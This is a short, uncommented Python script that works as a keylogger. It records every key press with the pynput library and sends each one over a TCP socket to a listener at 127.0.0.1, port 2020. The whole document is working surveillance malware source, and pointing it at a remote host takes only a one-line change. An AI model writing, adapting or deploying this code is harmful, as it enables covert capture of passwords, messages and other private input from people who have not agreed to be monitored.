#!/usr/bin/env python3

from pynput.keyboard import Listener
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('127.0.0.1',2020))


def on_press(key):
    s.send(bytes(str(key),'utf-8'))

l = Listener(on_press=on_press)
l.start()
l.join()\
    